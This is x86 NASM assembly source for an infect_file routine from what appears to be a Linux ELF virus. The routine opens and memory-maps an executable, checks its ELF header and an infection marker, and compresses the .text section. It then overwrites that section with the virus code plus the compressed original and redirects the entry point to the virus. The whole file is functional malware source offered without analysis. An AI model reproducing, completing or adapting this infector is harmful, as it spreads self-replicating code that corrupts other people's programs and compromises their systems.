; By using this file, you agree to the terms and conditions set
; forth in the COPYING file which can be found at the top level
; of this distribution.
;
;------------------------------------------------------------------------------
%define	text_offset	[ebp - 0]
%define	text_size	[ebp - 4]
%define	text_addr	[ebp - 8]
%define	file_handle	[ebp - 12]
%define file_length	[ebp - 16]
%ifdef	USE_BRK
%define	old_brk		[ebp - 20]
%else
%define	mmap_addr	[ebp - 20]
%define	mmap_size	[ebp - 24]
%endif
infect_file:	pusha
		enter	32, 0
		
		; filename
		mov	ebx, [ebp + 40]

		; open(filename, 2)
		movb	eax, SYS_open
		movb	ecx, 2
		int	0x80
		or	eax, eax
		js	.return
		mov	file_handle, eax
		xchg	eax, ebx
		; lseek(h, 0, 2)
		movb	eax, SYS_lseek
		movb	ecx, 0
		movb	edx, 2
		int	0x80
		cmp	eax, 1024
		jb	.close
		mov	file_length, eax
		xchg	eax, edx
		; mmap(NULL,length,PROT_READ|PROT_WRITE,MAP_SHARED,handle,offset)
		push	ebx				
		mpush	0, ebx, 1, 3, edx, 0
		movb	eax, SYS_mmap
		mov	ebx, esp
		int	0x80				
		add	esp, byte 24
		cmp	eax, 0xfffff000
		pop	ebx		
		ja	.close
		xchg	eax, esi
		; Check ELF header
		cmp	dword [esi], 0x464c457f		; ELF file?
		jne	.unmap_near
%ifdef	ALREADY_INFECTED
		cmp	byte [esi + 15], 1		; already signature
		je	.unmap_near
%endif
		cmp	dword [esi + 16], 0x00030002	; e_type == ET_EXEC &&
		jne	.unmap_near			; e_machine == EM_386
%ifdef BE_PARANOID
		cmp	dword [esi + e_version], 1
		jne	.unmap_near
%endif
		mov	al, [esi + 7]			; e_ident[EI_OSABI]
		cmp	al, 3				; Linux?
		je	.header_ok
		cmp	al, 0				; None? ;-)
		jne	.unmap
.header_ok:
		; find string table
		movzx	eax, word [esi + e_shstrndx]
		or	eax, eax
		jz	.unmap			;SHN_UNDEF
		lea	eax, [eax * 4 + eax]
		lea	eax, [eax * 8]
		add	eax, [esi + e_shoff]	; eax = e_shstrndx * 40 + e_shoff
		mov	edx, [esi + eax + sh_offset]
%ifdef BE_PARANOID
		cmp	edx, file_length
		jae	.unmap
%endif
		add	edx, esi
		; edx contain pointer to the string table

		; find .text section
		mov	edi, [esi + e_shoff]
		add	edi, esi
		movzx	ecx, word [esi + e_shnum]
		or	ecx, ecx
		jz	.unmap
.find_text_sec:	mov	eax, [edi + sh_name]
		lea	eax, [eax + edx]
%ifdef CMP_CRC32
		push	5
		push	eax
		call	crc32
		cmp	eax, 0xa21c1ea3
		je	.found_sec
%else
		cmp	dword [eax + 1], 'text'
		je	.found_sec
%endif
		add	edi, sizeof_shdr
		loop	.find_text_sec
.unmap_near:	jmp	.unmap
		; save sh_offset, sh_size and sh_addr
.found_sec:	
		mov	eax, [edi + sh_addr]
		mov	text_addr, eax
		mov	eax, [edi + sh_size]
		mov	text_size, eax
		mov	edx, [edi + sh_offset]
		mov	text_offset, edx
%ifdef	BE_PARANOID
		add	eax, edx
		cmp	eax, file_length
		jae	.unmap
%endif

%ifdef	USE_BRK		
		; save old_brk
		movb	eax, SYS_brk
		xor	ebx, ebx
		int	0x80
		mov	old_brk, eax		
		; alloc memory for the compressed copy and buffer
		xchg	eax, ebx
		push	ebx
		add	ebx, text_size
		push	ebx
		add	ebx, CTEMP_SIZE
		movb	eax, SYS_brk
		int	0x80
		cmp	eax, ebx
		pop	edx
		pop	ebx
		jne	.free
%ifdef SAFE_BRK
		pusha
		mov     ebx, old_brk
		and     ebx, 0xfffff000
		mov     ecx, eax
		sub     ecx, ebx
		mov     edx, PROT_READ|PROT_WRITE
		mov     eax, SYS_mprotect
		int     0x80
		popa
%endif ;SAFEBRK
%else
		pusha
		mov	eax, SYS_mmap2
		xor	ebx, ebx
		mov	ecx, text_size
		add	ecx, CTEMP_SIZE
		mov	mmap_size, ecx
		mov	edx, PROT_READ|PROT_WRITE 
		mov	esi, MAP_ANONYMOUS|MAP_PRIVATE
		xor	edi, edi
		xor	ebp, ebp
		int	0x80
		mov	[esp + 28], eax
		popa
		cmp	eax, 0xfffff000
		ja	.unmap
		mov	mmap_addr, eax
		xchg	eax, ebx
		mov	edx, ebx
		add	edx, text_size
%endif ;USE_BRK

		; compress .text section		
		mov	eax, text_offset
		add	eax, esi
		push	edx
		push	dword text_size
		push	ebx
		push	eax
		call	compress
		add	esp, 16
		or	eax, eax
		jz	.unmap
		mov	edx, eax
		
		; do we have enough room? csize + vsize must be lesser than size of .text
		mov	ecx, VIRUS_SIZE
		add	eax, ecx
		cmp	eax, text_size
		ja	.unmap
		; ecx - virus size		
		; edx - size of the compressed .text section

		; copy virus code
		cld
		push	esi
		push	ecx
		mov	eax, text_offset
		lea	edi, [esi + eax]
		call	get_delta
		mov	esi, eax
		rep	movsb
		pop	ecx
		pop	esi

		; copy compressed .text section
		push	esi
		lea	edi, [esi + ecx] ;VIRUS_SIZE
		add	edi, text_offset		
		mov	esi, ebx
		mov	ecx, edx
		rep	movsb
		pop	esi
		
%ifdef ZERO_FREE_SPACE
		mov	ecx, text_size
		sub	ecx, edx
		sub	ecx, VIRUS_SIZE
		xor	eax, eax
		rep	stosb
%endif
		mov	eax, text_offset
		lea	edi, [esi + eax]
		; save old entry point
		mov	eax, [esi + e_entry]
		mov	[edi + O(old_entry)], eax
		; set new entry point
		mov	eax, text_addr
		mov	[esi + e_entry], eax
		; save section size (for mprotect)
		mov	eax, text_size
		mov	[edi + O(memsize)], eax
%ifdef	ALREADY_INFECTED
		mov	byte [esi + 15], 1
%endif
		
.free:		; free memory
%ifdef	USE_BRK
		movb	eax, SYS_brk
		mov	ebx, old_brk
		int	0x80
%else
		mov	eax, SYS_munmap
		mov	ebx, mmap_addr
		mov	ecx, mmap_size
		int	0x80
%endif

.unmap:		mov	ebx, file_handle
		mov	edx, file_length
		
		push    ebx
		movb	eax, SYS_munmap
		mov	ebx, esi
		mov	ecx, edx
		int	0x80
		pop	ebx
.close:		movb	eax, SYS_close
		int	0x80
.return:	leave
		popa
		retn	4
;EOF
